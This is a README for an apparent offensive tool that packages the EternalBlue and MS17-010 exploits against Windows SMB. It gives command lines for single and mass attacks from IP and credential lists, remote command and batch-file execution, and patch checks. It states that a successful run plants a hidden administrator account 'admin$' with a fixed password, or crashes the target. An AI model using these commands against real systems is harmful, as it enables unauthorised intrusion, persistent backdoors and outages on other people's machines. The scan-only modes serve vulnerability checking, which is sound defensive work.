# ms17010-nsa-EternalBlue
integration ms17010 and nsa-EternalBlue

主要集成nsa的永恒之蓝和ms17010系列poc。
永恒之蓝poc有windows 7/2008 和 windows 8/2012 x64
ms17010 则是win all，Windows Vista以下可以匿名成功获取system权限，
vista以上则需要 命名管道 接入权限，一般需要域用户权限。

Usage: "usage:MyExploiter.py [options] target"

Options:

  --version             show program's version number and exit
  
  -h, --help            show this help message and exit
  
  -m MODE, --mode=MODE  attack mode 0:ms17010 attack one; 1: ms17010 attack by
  
                        file; 2:blue attack one;3:blue attack Mul;4:check
						
                        one;5:check Mul)
						
  -p PORT, --port=PORT  SMB SERVICE PORT
  
  -u USER, --user=USER  SMB USER
  
  -U USERS, --users=USERS user file,SMB USERS
						
  --pwd=password        SMB USER PASSWORD
  
  --pwds=passwords, --pwds=passwords  pwd file,EACH SMB USER PASSWORDS
						
  -t THREADS, --threads=THREADS  thread num
						
  -c COMMOND, --cmd=COMMOND  execute commond on target
						
  -b BATCH, --batch=BATCH    batch file,execute batch file on target
  
  eg:
  模式0：自动执行ms17010攻击，攻击成功后靶机增加管理员账号admin$/admin$12345 
  
  ms17010EXP 192.168.1.10 || ms17010EXP -U user.txt        --pwds=pwd.txt -t(线程数) 2 192.168.1.10
  
  模式1：批量执行ms17010攻击，攻击成功后靶机增加管理员账号admin$/admin$12345  
  
  ms17010EXP -m 1 ip.txt || ms17010EXP -m 1 -U user.txt --pwds=pwd.txt -t(线程数) 2 ip.txt
  
  模式2：执行永恒之蓝攻击，shellcode为shellcode.bin,成功后靶机或蓝屏或增加用户admin$/admin$12345 
  
  ms17010EXP -m 2 192.168.1.10
  
  模式3，批量永恒之蓝攻击，ms17010EXP -m 3 ip.txt
  
  模式4，检测靶机是否打补丁及命名管道的接入情况  ms17010EXP -m 4 192.168.1.10
  
  模式5，批量检测 ms17010EXP -m 5 -t 2 --users=user.txt --pwds=pwd.txt ip.txt

  注意：用户名字典 密码字典 最后一行置空，即每行必须有换行符。
  
						
基于：https://github.com/worawit/MS17-010 

